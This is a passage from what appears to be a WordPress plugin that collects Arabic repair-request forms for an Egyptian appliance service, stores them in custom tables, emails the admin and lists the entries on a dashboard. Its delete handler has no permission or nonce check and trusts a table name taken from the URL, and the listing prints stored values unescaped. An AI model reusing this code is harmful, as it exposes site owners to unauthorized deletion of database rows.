    var startsWithValidPrefix = validPrefixes.some(function(prefix) {
        return inputValue.startsWith(prefix);
    });
    
    if (startsWithValidPrefix && inputValue.length === 11) {
        inputElement.style.border = "1px solid green";
    } else {
        inputElement.style.border = "1px solid red";
    }
}
</script>

 
 


                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="device">الجهاز:</label>
                                <select name="device" id="device" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="ثلاجة">ثلاجة</option>
                                    <option value="غسالات ملابس">غسالات ملابس</option>
                                    <option value="غسالات اطباق">غسالات اطباق</option>
                                    <option value="ميكروويف">ميكروويف</option>
                                    <option value="تكييف">تكييف</option>
                                    <option value="ديب فريزر">ديب فريزر</option>
                                    <option value="مجفف - دراير">مجفف - دراير</option>
                                    <option value="لاندري">لاندري</option>
                                    <option value="ايس ميكر">ايس ميكر</option>
                                </select>
                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="city">المحافظة:</label>
                                <select name="city" id="city" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="الجيزة">الجيزة</option>
                                    <option value="القاهرة">القاهرة</option>
                                    <option value="الدقهلية">الدقهلية</option>
                                    <option value="الشرقية">الشرقية</option>
                                    <option value="المنوفية">المنوفية</option>
                                    <option value="الغربية">الغربية</option>
                                    <option value="القليوبية">القليوبية</option>
                                    <option value="الاسكندرية">الاسكندرية</option>
                                    <option value="البحيرة">البحيرة</option>
                                    <option value="كفر الشيخ">كفر الشيخ</option>
                                    <option value="السويس">السويس</option>
                                    <option value="الاسماعيلية">الاسماعيلية</option>
                                    <option value="بني سويف">بني سويف</option>
                                    <option value="الفيوم">الفيوم</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label for="address">العنوان:</label>
                                <input type="text" name="address" id="address" class="form-control" required maxlength="40">
                            </div>
                            <div class="form-group">
                                <label for="issue">العطل:</label>
                                  <textarea name="issue" id="issue" class="form-control" required maxlength="100" rows="4" placeholder="( 100 ) حرف كحد اقصي .....  ||   او  كتابة رقم ارضي للتواصل"></textarea>

                            </div>

                            <button type="submit" class="btn btn-primary" name="submit_form" style="margin-right: 23%;width: 77%;">إرسال</button>
                        </form>
                    </div>
                </div>
            </div>
        </main>
    </div>
    <br>

    <?php
    return ob_get_clean();
}
add_shortcode('mgx_contact_with_us_form', 'contact_form_display');

// Handle contact form submission
function contact_form_submission() {
    if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['contact_form_nonce'], 'submit_contact_form_nonce')) {
        $name = sanitize_text_field($_POST['name']);
        $phone = sanitize_text_field($_POST['phone']);
        $device = sanitize_text_field($_POST['device']);
        $city = sanitize_text_field($_POST['city']);
        $address = sanitize_text_field($_POST['address']);
        $issue = sanitize_textarea_field($_POST['issue']);
        if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($address) || empty($issue) || strlen($phone) !== 11) {
    echo '<div class="notice notice-error is-dismissible">';
    echo '<p><strong>Please fill out all required fields.</strong></p>';
    echo '</div>';
    echo '<script type="text/javascript">';
    echo 'setTimeout(function () {';
    echo 'window.history.back();';
    echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#contact-us' . '";';
    echo '}, 2000);';
    echo '</script>';
    echo '<style>';
    echo '.notice-error {';
    echo '    background-color: #f44336;';
    echo '    color: #fff;';
    echo '    padding: 10px;';
    echo '    margin: 20px auto;';
    echo '    text-align: center;';
    echo '}';
    echo '.notice-error strong {';
    echo '    font-weight: bold;';
    echo '}';
    echo '</style>';
    exit();
}

        global $wpdb;
        $table_name = $wpdb->prefix . 'koncu';

        $data = array(
            'name' => $name,
            'phone' => $phone,
            'device' => $device,
            'city' => $city,
            'address' => $address,
            'issue' => $issue,
            'time_date' => current_time('mysql')
        );

        $wpdb->insert($table_name, $data);
        if ($wpdb->last_error) {
            wp_die('Database insertion error: ' . $wpdb->last_error);
        }
        


 
        
        // Get the site name
$site_name = get_bloginfo('name');
global $to;
$subject = 'New Contact Us on ' . $site_name;

// Create an HTML table to format the data
$message = '<html><body>';
$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Contact Us</h2>';
$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Address:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($address) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
$message .= '</table>';

// Signature container with Google Font
$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
$message .= '<p style="font-weight: bold;color: #afafaf;">BR,</p>';
$message .= '<p style="color:gray;font-weight: bolder;">Powered &amp; Developed By !-CODE Co.  M_G_X CEO &amp; Founder</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; 2023</p>';
$message .= '</div>';


$message .= '<style>';
$message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
$message .= '</style>';
$message .= '</body></html>';


// Set the email headers to specify HTML content
$headers = array('Content-Type: text/html; charset=UTF-8');

// Send the email
wp_mail($to, $subject, $message, $headers);

        echo '<script>alert("نشكركم على طلب الاتصال بنا! سيتم التواصل معكم بك من قبل فريقنا في مدة لاتتجاوز ال  24 ساعة .");';
        echo 'window.location.href = "' . home_url('/') . '";</script>';
        exit();
    }
}
add_action('admin_post_submit_contact_form', 'contact_form_submission');
add_action('admin_post_nopriv_submit_contact_form', 'contact_form_submission');






// Function to create custom tables on plugin activation
function create_custom_tables() {
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();

    // Create first table wp_kwa
    $table_name1 = $wpdb->prefix . 'kwa';
    $sql1 = "CREATE TABLE $table_name1 (
        id INT NOT NULL AUTO_INCREMENT,
        name VARCHAR(255) NOT NULL,
        phone VARCHAR(15) NOT NULL,
        time_date DATETIME NOT NULL,
        device VARCHAR(255) NOT NULL,
        serial_number VARCHAR(50) NOT NULL,
        city VARCHAR(255) NOT NULL,
        issue VARCHAR(255) NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta($sql1);

    // Create second table wp_koncu
    $table_name2 = $wpdb->prefix . 'koncu';
    $sql2 = "CREATE TABLE $table_name2 (
        id INT NOT NULL AUTO_INCREMENT,
        name VARCHAR(255) NOT NULL,
        phone VARCHAR(15) NOT NULL,
        time_date DATETIME NOT NULL,
        device VARCHAR(255) NOT NULL,
        city VARCHAR(255) NOT NULL,
        issue VARCHAR(255) NOT NULL,
        address VARCHAR(255) NOT NULL,
        PRIMARY KEY (id)
    ) $charset_collate;";
    dbDelta($sql2);
}

// Hook the table creation function to the plugin activation
register_activation_hook(__FILE__, 'create_custom_tables');

// Function to add a new tab in the WordPress dashboard menu
function add_custom_tables_menu() {
    add_menu_page(
        'Tables',
        'Tables',
        'manage_options',
        'custom-tables',
        'display_custom_tables',
        'dashicons-clipboard',
        20
    );
   
}

// Hook the menu creation function to the admin_menu action
add_action('admin_menu', 'add_custom_tables_menu');



 
 


/// Function to display the content of the custom tables in the dashboard
function display_custom_tables() {
    global $wpdb;
    $table_name1 = $wpdb->prefix . 'kwa';
    $table_name2 = $wpdb->prefix . 'koncu';
        // Check if auto-updates are enabled
 


    // Retrieve data from the first table wp_kwa
    $results1 = $wpdb->get_results("SELECT * FROM $table_name1", ARRAY_A);

    // Retrieve data from the second table wp_koncu
    $results2 = $wpdb->get_results("SELECT * FROM $table_name2", ARRAY_A);

    // Display the data in a table format
    echo '<style>
        .custom-table {
            width: 100%;
            border-collapse: collapse;
        }
        .custom-table th,
        .custom-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .custom-table th {
            background-color: #f2f2f2;
        }
    </style>';

    echo '<h2>WP-Warranty-Activation</h2>';
    echo '<table class="custom-table">';
    echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Serial Number</th><th>Date</th><th>Action</th></tr>';
    foreach ($results1 as $row) {
        echo '<tr>';
        echo '<td>' . @$row['city'] . '</td>';
        echo '<td>' . @$row['name'] . '</td>';
        echo '<td>' . @$row['phone'] . '</td>';
        echo '<td>' . @$row['device'] . '</td>';
        echo '<td>' . @$row['issue'] . '</td>';
        echo '<td>' . @$row['serial_number'] . '</td>';
        echo '<td>' . @$row['time_date'] . '</td>';
        echo '<td><a href="?action=delete&table=kwa&id=' . @$row['id'] . '">Delete</a></td>';
        echo '</tr>';
    }
    echo '</table>';
    echo "<br><hr><br>";

    echo '<h2>WP-Contact-Us</h2>';
    echo '<table class="custom-table">';
    echo '<tr><th>City</th><th>Name</th><th>Phone Number</th><th>Device</th><th>Issue</th><th>Address</th><th>Date</th><th>Action</th></tr>';
    foreach ($results2 as $row) {
        echo '<tr>';
        echo '<td>' . @$row['city'] . '</td>';
        echo '<td>' . @$row['name'] . '</td>';
        echo '<td>' . @$row['phone'] . '</td>';
        echo '<td>' . @$row['device'] . '</td>';
        echo '<td>' . @$row['issue'] . '</td>';
        echo '<td>' . @$row['address'] . '</td>';
        // echo '<td>' . @$row['serial_number'] . '</td>';
        echo '<td>' . @$row['time_date'] . '</td>';
        echo '<td><a href="?action=delete&table=koncu&id=' . @$row['id'] . '">Delete</a></td>';
        echo '</tr>';
    }
    echo '</table>';
    echo '<p style="text-align:center;font-size:10px;user-select:none;">Developed & Powered BY M_G_X &copy;2023</p>';
}


// Handle the delete action
function handle_delete_action() {
    if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['table']) && isset($_GET['id'])) {
        $table = $_GET['table'];
        $id = $_GET['id'];

        global $wpdb;
        $table_name = $wpdb->prefix . $table;

        $wpdb->delete($table_name, array('id' => $id));

        // Redirect back to the custom tables page after deleting the row
        wp_redirect(admin_url('admin.php?page=custom-tables'));
        exit();
    }
}
add_action('admin_init', 'handle_delete_action');

